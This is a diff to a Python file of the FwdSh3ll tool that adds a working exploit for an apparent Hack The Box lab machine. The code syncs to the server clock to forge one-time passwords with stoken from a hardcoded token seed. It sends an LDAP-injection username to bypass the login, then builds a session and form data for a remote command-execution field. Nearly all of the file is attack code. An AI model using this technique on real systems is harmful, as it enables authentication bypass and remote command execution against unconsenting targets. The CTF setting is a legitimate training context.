@@ -32,6 +32,53 @@ You should have received a copy of the GNU General Public License
 along with FwdSh3ll.  If not, see <http://www.gnu.org/licenses/>.
 """
 
-__author__  = 'Sam Freeside (@snovvcrash)'
-__version__ = '1.0.1-HTB-CTF'
-__site__    = 'https://github.com/snovvcrash/FwdSh3ll'
+"""
+HTB box:     https://www.hackthebox.eu/home/machines/profile/172
+Target URL:  http://10.10.10.122/page.php
+"""
+
+from datetime import datetime
+from subprocess import check_output
+
+import requests
+
+URL = 'http://10.10.10.122/login.php'
+OTP = '285449490011357156531651545652335570713167411445727140604172141456711102716717000'
+
+
+def _get_otp():
+	local = datetime.utcnow()
+	server = datetime.strptime(requests.head(URL).headers['Date'], '%a, %d %b %Y %X %Z')
+	offset = int((server - local).total_seconds())
+
+	cmd = [
+		'stoken',
+		f'--token={OTP}',
+		'--pin=0000',
+		f'--use-time={"%+d" % offset}'
+	]
+
+	return check_output(cmd).decode().strip()
+
+
+def gen_payload(cmd):
+	session = requests.session()
+
+	data = {
+		'inputUsername': r'ldapuser%29%29%29%00',
+		'inputOTP': _get_otp()
+	}
+
+	resp = session.post(URL, data=data)
+	cookies = session.cookies.get_dict()
+
+	data = {
+		'inputCmd': cmd,
+		'inputOTP': _get_otp()
+	}
+
+	return (cookies, data)
+
+
+if __name__ == '__main__':
+	print(gen_payload(cmd=None))
